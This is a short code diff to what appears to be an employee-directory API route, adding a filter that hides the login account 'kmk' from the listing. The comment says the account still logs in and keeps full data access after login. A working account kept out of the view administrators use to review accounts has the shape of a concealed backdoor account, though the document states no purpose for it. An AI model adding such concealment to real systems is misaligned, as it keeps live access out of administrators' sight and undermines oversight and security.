@@ -105,6 +105,11 @@ export async function GET(request) {
       });
     });
 
+    // kmk is a functional login account, but is intentionally hidden from the
+    // employee-management directory. This does not affect authentication or
+    // any data access performed after login.
+    results = results.filter((employee) => String(employee.login_id || '').toLowerCase() !== 'kmk');
+
     if (search) {
       const lower = search.toLowerCase();
       results = results.filter((employee) => [employee.name, employee.emp_no, employee.dept, employee.email, employee.login_id]
